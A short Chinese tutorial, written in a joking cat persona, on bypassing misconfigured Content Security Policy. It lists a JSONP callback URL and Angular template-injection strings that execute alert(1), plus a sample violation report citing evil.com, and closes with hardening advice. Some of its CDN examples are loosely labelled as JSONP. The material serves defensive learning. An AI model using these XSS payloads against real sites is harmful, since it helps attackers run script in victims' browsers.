概述

Content Security Policy (CSP) 是现代Web应用的重要安全机制，可以有效防止XSS攻击。然而，配置不当的CSP仍然可以被绕过。本文介绍几种常见的CSP绕过思路。

猫猫提示：CSP就像给猫咪戴的项圈，如果项圈太松，猫咪还是会跑掉 nya~

CSP基础

CSP通过HTTP头或meta标签定义，控制页面可以加载哪些资源：

# 常见CSP头
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'

关键指令：

  • default-src：默认策略
  • script-src：脚本来源
  • style-src：样式来源
  • img-src：图片来源
  • connect-src：AJAX/WebSocket来源

绕过技巧

1. JSONP绕过

如果CSP允许某些CDN域名，可以利用这些域名上的JSONP接口：

# 利用Google Analytics的JSONP
https://www.google.com/jsapi?callback=alert(1)

# 利用jQuery的JSONP
https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js

# 利用其他CDN的JSONP
https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js

2. 基于CSP报告的绕过

如果CSP配置了report-uri，可能泄露信息：

# CSP头
Content-Security-Policy: script-src 'self'; report-uri /csp-report

# 报告可能泄露的信息
{
  "csp-report": {
    "blocked-uri": "http://evil.com/evil.js",
    "document-uri": "http://target.com/page",
    "violated-directive": "script-src 'self'"
  }
}

3. 基于Angular的绕过

如果页面使用了Angular，可以利用其模板注入：

# Angular模板注入
{{constructor.constructor('alert(1)')()}}

# 利用Angular的ng-app

{{$eval.constructor('alert(1)')()}}

防御建议

  • 使用严格的CSP策略，避免'unsafe-inline'和'unsafe-eval'
  • 定期审计CSP配置
  • 使用nonce或hash来允许特定的内联脚本
  • 避免使用通配符*
  • 测试CSP配置的有效性
